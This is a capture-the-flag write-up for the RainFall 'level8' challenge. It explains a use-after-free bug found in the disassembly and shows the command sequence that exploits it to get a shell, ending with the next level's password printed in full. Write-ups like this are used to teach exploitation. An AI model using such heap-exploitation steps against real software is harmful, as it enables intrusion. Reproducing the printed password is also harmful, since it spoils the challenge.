# Write up

By reading the disassembled code, we directly thought about an Use after free exploit, this part especially :
```
 8048667:	85 c0                	test   eax,eax
 8048669:	75 0d                	jne    8048678 <main+0x114>
 804866b:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 8048670:	89 04 24             	mov    DWORD PTR [esp],eax
 8048673:	e8 a8 fd ff ff       	call   8048420 <free@plt>
 8048678:	8d 44 24 20          	lea    eax,[esp+0x20]
```
Is extremely suspicious, I wonder why the free call is escaped ? :)

While noticing various keywords in the source code, I try to execute a "auth " (The space is important) command once to set the first pointer , then reset twice to get a double free crash :
```
*** glibc detected *** ./level8: double free or corruption (fasttop): 0x0804a008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
./level8[0x8048678]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb7e454d3]
./level8[0x80484d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 12259      /home/user/level8/level8
08049000-0804a000 rwxp 00000000 00:10 12259      /home/user/level8/level8
0804a000-0806b000 rwxp 00000000 00:00 0          [heap]
b7e07000-b7e23000 r-xp 00000000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e23000-b7e24000 r-xp 0001b000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e24000-b7e25000 rwxp 0001c000 07:00 17889      /lib/i386-linux-gnu/libgcc_s.so.1
b7e2b000-b7e2c000 rwxp 00000000 00:00 0
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r-xp 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rwxp 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rwxp 00000000 00:00 0
b7fd8000-b7fdd000 rwxp 00000000 00:00 0
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r-xp 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rwxp 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
Aborted (core dumped)
```
By using the reset command, the auth pointer isn't NULL'ed, which triggers a double free if we execute free on it again.
Running a login command triggers a segv :
```
(gdb) run
Starting program: /home/user/level8/level8
(nil), (nil)
login

Program received signal SIGSEGV, Segmentation fault.
0x080486e7 in main ()
```
`0x080486e7` which is the address where we add 32 bytes to the auth command pointer address.
However, the segv disappears if we execute reset before executing the login command :
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
reset
0x804a008, (nil)
login
Password:
```
I notice then than the service command overwrite the auth address if we use it after auth was freed.
The main difference here is that the service command size isn't size limited, also we can reallocate it to move the pointer further.
Which let us bypass the null byte check and get our shell, Hooray !
```
./level8
(nil), (nil)
auth aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, (nil)
reset
0x804a008, (nil)
servicaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018
servicaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a048
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Sources

https://beta.hackndo.com/use-after-free/
https://www.developpez.net/forums/d25009/autres-langages/assembleur/x86-32-bits-64-bits/quoi-sert-l-instruction-test-eax-eax/
https://www.gladir.com/LEXIQUE/ASM/repz.htm
https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb